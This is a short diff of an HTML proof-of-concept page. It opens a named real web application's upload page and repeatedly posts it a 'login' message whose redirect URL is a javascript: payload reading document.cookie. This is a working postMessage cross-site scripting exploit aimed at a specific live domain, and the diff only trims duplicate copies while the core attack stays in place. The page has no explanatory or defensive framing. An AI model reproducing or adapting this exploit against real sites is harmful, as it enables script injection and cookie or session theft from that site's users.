@@ -2,20 +2,8 @@
 <body>
 <script>
 hwin = window.open("https://adifox.adidas.com.cn/ap/#/uploadFile");
- hwin1 = window.open("https://adifox.adidas.com.cn/ap/#/uploadFile");
- hwin2 = window.open("https://adifox.adidas.com.cn/ap/#/uploadFile");
- hwin3 = window.open("https://adifox.adidas.com.cn/ap/#/uploadFile");
 setInterval(function(){
  hwin.postMessage('{"type":"login","redirectUrl":"javascript:alert(document.cookie)"}',"*")
-},0.00001)
- setInterval(function(){
- hwin1.postMessage('{"type":"login","redirectUrl":"javascript:alert(document.cookie)"}',"*")
-},0.00001)
- setInterval(function(){
- hwin2.postMessage('{"type":"login","redirectUrl":"javascript:alert(document.cookie)"}',"*")
-},0.00001)
- setInterval(function(){
- hwin3.postMessage('{"type":"login","redirectUrl":"javascript:alert(document.cookie)"}',"*")
 },0.00001)
 </script>
 </body>
